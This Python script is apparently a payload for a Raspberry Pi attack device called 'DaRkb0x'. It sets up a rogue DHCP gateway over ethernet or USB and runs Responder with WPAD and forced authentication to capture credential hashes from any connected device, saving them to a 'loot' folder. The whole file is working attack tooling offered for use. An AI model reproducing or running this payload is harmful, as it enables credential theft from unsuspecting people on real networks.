#!/usr/bin/env python3
"""
DaRkb0x Payload -- Evil Ethernet
================================
Author: DaRkb0x

Sets up a rogue gateway on the ethernet interface (eth0/usb0),
hands out an IP via DHCP, and runs Responder to capture hashes
from any connected device.

Prerequisites: dnsmasq, responder
Loot: /root/DaRkb0x/loot/evil_ethernet/
"""

import os
import sys
import time
import subprocess
import threading
import signal

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw
from payloads._display_helper import ScaledDraw, scaled_font, S
from payloads._input_helper import get_button
from payloads._iface_helper import list_interfaces

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
LOOT_DIR = "/root/DaRkb0x/loot/evil_ethernet"

_shutdown = threading.Event()
_log_lines = []

def _cleanup_signal(*_):
    _shutdown.set()

signal.signal(signal.SIGINT, _cleanup_signal)
signal.signal(signal.SIGTERM, _cleanup_signal)

def log_msg(msg):
    _log_lines.append(msg)
    if len(_log_lines) > 8:
        _log_lines.pop(0)

def _find_ethernet():
    ifaces = list_interfaces("all")
    for iface in ifaces:
        if iface["name"].startswith("eth") or iface["name"].startswith("en") or iface["name"].startswith("usb"):
            return iface["name"]
    return None

def _setup_dhcp(iface):
    os.makedirs(LOOT_DIR, exist_ok=True)
    conf_path = os.path.join(LOOT_DIR, "dnsmasq.conf")
    with open(conf_path, "w") as f:
        f.write(f"interface={iface}\n")
        f.write("dhcp-range=10.10.10.100,10.10.10.200,12h\n")
        f.write("dhcp-option=3,10.10.10.1\n")
        f.write("dhcp-option=6,10.10.10.1\n")
    
    subprocess.run(["sudo", "ip", "addr", "add", "10.10.10.1/24", "dev", iface], capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True)
    
    # Kill existing dnsmasq
    subprocess.run(["sudo", "killall", "dnsmasq"], capture_output=True)
    time.sleep(1)
    
    proc = subprocess.Popen(["sudo", "dnsmasq", "-C", conf_path, "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return proc

def _start_responder(iface):
    cmd = ["sudo", "python3", "/root/DaRkb0x/Responder/Responder.py", "-I", iface, "-w", "On", "-F", "On"]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    return proc

def main():
    os.makedirs(LOOT_DIR, exist_ok=True)
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font(10)
    font_sm = scaled_font(8)

    eth_iface = _find_ethernet()
    
    if not eth_iface:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((5, 40), "No Ethernet", font=font, fill="#FFFFFF")
        d.text((5, 60), "interface found!", font=font_sm, fill="#FFFFFF")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        return

    log_msg(f"Found iface: {eth_iface}")
    log_msg("Starting DHCP server...")
    dhcp_proc = _setup_dhcp(eth_iface)
    
    log_msg("Starting Responder...")
    resp_proc = _start_responder(eth_iface)

    def _read_responder(proc):
        for line in proc.stdout:
            if "Poisoned" in line or "Captured" in line or "Hash" in line:
                log_msg(">>> HASH CAPTURED! <<<")
            elif "Listening" in line:
                log_msg("Responder listening")
            if _shutdown.is_set():
                break

    threading.Thread(target=_read_responder, args=(resp_proc,), daemon=True).start()

    while not _shutdown.is_set():
        btn = get_button(PINS, GPIO)
        if btn == "KEY3":
            break

        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.rectangle((0, 0, 127, 12), fill="#444444")
        d.text((2, 1), "EVIL ETHERNET", font=font_sm, fill="#FFFFFF")
        d.text((90, 1), eth_iface, font=font_sm, fill="#FFFFFF")

        y = 16
        for line in _log_lines:
            color = "#FFFFFF" if ">>>" in line else "#CCCCCC"
            d.text((2, y), line[:24], font=font_sm, fill=color)
            y += 12

        d.rectangle((0, 116, 127, 127), fill="#111111")
        d.text((2, 117), "K3: Exit / Stop", font=font_sm, fill="#CCCCCC")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(0.1)

    log_msg("Stopping services...")
    if dhcp_proc: dhcp_proc.terminate()
    if resp_proc: resp_proc.terminate()
    subprocess.run(["sudo", "ip", "addr", "del", "10.10.10.1/24", "dev", eth_iface], capture_output=True)

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((20, 50), "STOPPED", font=font, fill="#FFFFFF")
    lcd.LCD_ShowImage(img, 0, 0)
    time.sleep(1)

if __name__ == "__main__":
    main()
